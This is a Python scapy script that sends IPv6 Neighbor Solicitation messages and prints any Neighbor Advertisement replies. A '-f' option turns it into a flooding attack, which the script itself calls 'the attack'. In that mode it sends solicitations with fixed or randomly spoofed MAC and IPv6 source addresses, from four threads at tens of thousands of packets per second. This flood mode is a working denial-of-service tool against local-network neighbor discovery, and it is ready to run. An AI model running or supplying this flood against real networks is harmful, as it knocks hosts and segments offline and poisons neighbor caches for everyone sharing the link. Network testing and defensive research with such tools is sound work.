#!/usr/bin/python3
import argparse
import logging
import random
import sys
import threading

import netifaces
from scapy.arch import get_if_hwaddr
from scapy.layers.inet6 import ICMPv6ND_NS, ICMPv6NDOptSrcLLAddr, IPv6, ICMPv6ND_NA
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, sendpfast, srp1

from validate_parameters import is_valid_ipv6, is_valid_mac, mac2ipv6, get_ipv6_multicast_solicited_address, \
    convert_flag


def main():
    parser = argparse.ArgumentParser(description="|> Sending Neighbor Solicitation message to the specified target, "
                                                 "with option to flood.")

    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender.")
    parser.add_argument("-smac", dest="source_mac", action="store",
                        help="the MAC address of sender (resolved from the interface if skipping).")
    parser.add_argument("-dmac", dest="dest_mac", action="store",
                        help="the MAC address of destination (33:33:00:00:00:01 if skipping).")
    parser.add_argument("-sip", dest="source_ip", action="store", help="the IPv6 address of sender (resolved from the"
                                                                       " interface if skipping).")
    parser.add_argument("-dip", dest="destination_ip", action="store", help="the IPv6 address of destination ("
                                                                            "resolved from target address if skipping).")
    parser.add_argument("-tip", dest="target_ip", action="store", help="the IPv6 address of target (ff02::1 if "
                                                                       "skipping).")
    parser.add_argument("-f", dest="flood", action="store", choices=['constant', 'random'],
                        help="flood the target with option: sending Neighbor Solicitation messages using only the "
                             "defined source addresses (constant), or sending Neighbor Solicitation messages with "
                             "many random source addresses (random).")

    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source IPv6 address
    if args.source_ip is None:
        length = len(netifaces.ifaddresses(args.interface)[netifaces.AF_INET6])
        args.source_ip = netifaces.ifaddresses(args.interface)[netifaces.AF_INET6][length - 1]['addr']
        args.source_ip = args.source_ip.replace("%", '')
        args.source_ip = args.source_ip.replace(args.interface, '')
    if args.source_ip is not None:
        if not is_valid_ipv6(args.source_ip):
            print("---> The given source IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the target IPv6 address
    if args.target_ip is None:
        args.target_ip = "ff02::1"
    if args.target_ip is not None:
        if not is_valid_ipv6(args.target_ip):
            print("---> The given target IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the destination IPv6 address
    if args.destination_ip is None:
        args.destination_ip = get_ipv6_multicast_solicited_address(args.target_ip)
    if args.destination_ip is not None:
        if not is_valid_ipv6(args.destination_ip):
            print("---> The given destination IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source MAC address
    if args.source_mac is None:
        args.source_mac = get_if_hwaddr(args.interface)
    if args.source_mac is not None:
        if not is_valid_mac(args.source_mac):
            print("---> The given source MAC address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the destination MAC address
    if args.dest_mac is None:
        args.dest_mac = "33:33:00:00:00:01"
    if args.dest_mac is not None:
        if not is_valid_mac(args.dest_mac):
            print("---> The given destination MAC address is invalid. Try again!!!")
            sys.exit(1)

    # Turning off logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    # Generate the packet
    if not args.flood:
        layer2 = Ether(src=args.source_mac, dst=args.dest_mac)
        layer3 = IPv6(src=args.source_ip, dst=args.destination_ip)
        packet1 = layer2 / layer3 / ICMPv6ND_NS(tgt=args.target_ip) / ICMPv6NDOptSrcLLAddr(lladdr=args.source_mac)
        print("Sending Neighbor Solicitation to the destination: " + args.destination_ip)

        # send the packet and receive the response
        responses = srp1(packet1, iface=args.interface, timeout=2, verbose=0)

        # check if a response was received
        if responses is not None:
            for response in responses:
                if response is not None and ICMPv6ND_NA in response:
                    # print the source MAC address of the response
                    print("===> Received Neighbor Advertisement from", response[1].src)
                    print("              with MAC address: ", response.src)
                    print("              Flags: R-" + convert_flag(response[ICMPv6ND_NA].R) + ", S-" + convert_flag(response[ICMPv6ND_NA].S) + ", O-" + convert_flag(response[ICMPv6ND_NA].O))
                else:
                    print("===> No response received.")
                    break
        if responses is None:
            print("===> No response received.")

    if args.flood:
        pkt_list = []
        print("Flooding the destination: " + args.destination_ip + " with Neighbor Solicitation messages (press Ctrl+C "
                                                                   "to stop the attack).....")
        if args.flood == "random":
            for i in range(200):
                random_mac = "00:18:5b:%02x:%02x:%02x" % (random.randint(0, 255),
                                                          random.randint(0, 255),
                                                          random.randint(0, 255))
                source_ip = mac2ipv6(random_mac)
                layer2 = Ether(src=random_mac, dst="33:33:00:00:00:01")
                layer3 = IPv6(src=source_ip, dst=args.destination_ip)
                packet1 = layer2 / layer3 / ICMPv6ND_NS(tgt=args.target_ip) / ICMPv6NDOptSrcLLAddr(lladdr=random_mac)
                pkt_list.append(packet1)

        if args.flood == "constant":
            layer2 = Ether(src=args.source_mac, dst=args.dest_mac)
            layer3 = IPv6(src=args.source_ip, dst=args.destination_ip)
            packet1 = layer2 / layer3 / ICMPv6ND_NS(tgt=args.target_ip) / ICMPv6NDOptSrcLLAddr(lladdr=args.source_mac)
            for i in range(200):
                pkt_list.append(packet1)

        def send_packets(packet, iface):
            try:
                sendpfast(packet, mbps=60000, pps=30000, loop=5000000, iface=iface)
            except KeyboardInterrupt:
                pass

        threads = []
        for i in range(4):
            thread = threading.Thread(target=send_packets, args=(pkt_list, args.interface))
            threads.append(thread)
            thread.start()

        # wait for all threads to complete
        for thread in threads:
            thread.join()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        # If KeyboardInterrupt is raised in the main thread, stop all child threads
        threading.Event().set()
        sys.exit(0)
